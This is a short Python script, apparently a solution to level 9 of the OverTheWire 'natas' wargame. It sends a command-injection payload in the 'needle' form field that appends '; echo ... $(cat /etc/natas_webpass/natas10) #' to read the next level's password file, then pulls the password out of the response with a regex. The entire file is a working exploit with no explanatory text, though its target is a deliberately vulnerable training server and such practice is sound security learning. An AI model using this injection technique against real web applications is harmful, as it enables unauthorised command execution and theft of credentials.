import re

from natas.lib import natas_session

session, url = natas_session(9)

payload = "; echo Level 10 password is $(cat /etc/natas_webpass/natas10) #"

response = session.post(url, data={"needle": payload, "submit": "submit"})

regex = r"Level 10 password is (.*)"
print(re.findall(regex, response.text)[0])
